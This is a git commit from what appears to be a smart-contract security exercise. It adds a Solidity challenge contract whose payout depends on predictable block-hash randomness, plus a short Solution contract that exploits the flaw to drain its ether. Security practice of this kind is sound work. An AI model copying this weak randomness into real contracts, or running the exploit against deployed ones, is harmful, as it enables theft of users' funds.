b23f02aa4c80c986b3bd1790d8d5201813e4e93f
Santiago Trujillo Zuluaga <stztrujillo@hotmail.com>
2023-03-14 08:56:09 +0000

    PredictTheFuture solved

---
+++ Week6/Ether Challenges/contracts/PredictTheFuture.sol
@@ -0,0 +1,62 @@
+// SPDX-License-Identifier: UNLICENSED
+
+pragma solidity ^0.4.21;
+
+contract PredictTheFutureChallenge {
+    address guesser;
+    uint8 guess;
+    uint256 settlementBlockNumber;
+
+    function PredictTheFutureChallenge() public payable {
+        require(msg.value == 1 ether);
+    }
+
+    function isComplete() public view returns (bool) {
+        return address(this).balance == 0;
+    }
+
+    function lockInGuess(uint8 n) public payable {
+        require(guesser == 0);
+        require(msg.value == 1 ether);
+
+        guesser = msg.sender;
+        guess = n;
+        settlementBlockNumber = block.number + 1;
+    }
+
+    function settle() public {
+        require(msg.sender == guesser);
+        require(block.number > settlementBlockNumber);
+
+        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
+
+        guesser = 0;
+        if (guess == answer) {
+            msg.sender.transfer(2 ether);
+        }
+    }
+}
+
+
+contract Solution{
+    PredictTheFutureChallenge public instance;
+
+    function Solution(PredictTheFutureChallenge instance_) public payable{
+        instance = instance_;
+    }
+
+    function setGuess() public payable{
+        instance.lockInGuess.value(1 ether)(0);
+    }
+
+    function attack() public {
+        instance.settle();
+        require(instance.isComplete());
+    }
+
+    function() public payable{
+    }
+
+    
+
+}
